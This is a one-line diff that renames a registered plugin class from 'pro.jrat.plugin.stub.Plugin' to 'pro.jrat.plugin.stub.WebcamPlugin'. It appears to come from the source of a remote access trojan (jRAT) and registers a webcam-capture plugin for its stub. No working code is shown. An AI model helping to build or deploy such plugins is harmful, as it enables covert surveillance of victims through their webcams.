@@ -1,1 +1,1 @@
-pro.jrat.plugin.stub.Plugin
+pro.jrat.plugin.stub.WebcamPlugin
